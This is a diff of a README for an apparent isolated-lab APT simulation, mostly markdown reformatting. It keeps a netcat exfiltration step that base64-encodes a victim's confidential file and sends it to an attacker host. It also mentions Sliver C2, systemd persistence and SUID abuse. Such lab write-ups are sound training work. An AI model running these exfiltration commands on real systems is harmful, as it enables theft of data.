@@ -18,7 +18,7 @@ Simulate a full APT lifecycle using open-source tools in an isolated lab environ
 | 4 | Exfiltration | Base64 + netcat (DNS tunneling attempted) | ✅ File recovered on attacker |
 
 ## Network Diagram
-[Flow](screenshots/diagram.png)
+![Flow](screenshots/diagram.png)
 
 ## 🖼️ Key Evidence (Screenshots)
 | Phase | Screenshot |
@@ -81,45 +81,24 @@ Simulate a full APT lifecycle using open-source tools in an isolated lab environ
 **Attempted:** DNS tunneling (dnscat2) — failed due to Ruby compatibility  
 **Adapted to:** Base64 + netcat
 
-```bash
 # Attacker listener
 nc -lvnp 9999
 
 # Victim (via Sliver shell)
 cat /home/victim/confidential.txt | base64 | nc 192.168.59.11 9999
 
-# Decode on Kali
-echo "<base64_data>" | base64 -d > exfiltrated.txt
-
+![File](screenshots/Screenshot_data_exfiltration.png)
 </details>
-📈 MITRE ATT&CK Techniques
-Tactic	Technique ID	Technique
-Initial Access	T1566.001	Phishing (simulated via SCP)
-Persistence	T1543.002	Systemd Service
-Privilege Escalation	T1548.001	SUID Abuse
-Lateral Movement	T1021.004	SSH Private Key Reuse
-Exfiltration	T1048.003	Exfiltration Over Alternative Protocol
 
-🛠️ Tools Used
-Sliver C2 — Open-source cross-platform C2
-
-mTLS — Encrypted C2 channel
-
-Systemd — Persistence mechanism
-
-GTFOBins — SUID exploitation reference
-
-Netcat — Data exfiltration
-
-⚠️ Disclaimer
+## ⚠️ Disclaimer
 This lab was conducted in an isolated VirtualBox environment with no connection to production networks. All techniques shown are for educational purposes and authorized security testing only.
 
-📁 Full Documentation
+## 📁 Full Documentation
 Detailed Phase Walkthrough
 
 Complete MITRE Mapping
 
 Indicators of Compromise
 
-📧 Contact
+## 📧 Contact
 [Pranmoy] — [https://www.linkedin.com/in/pranmoy-patar-b99a142b3/]
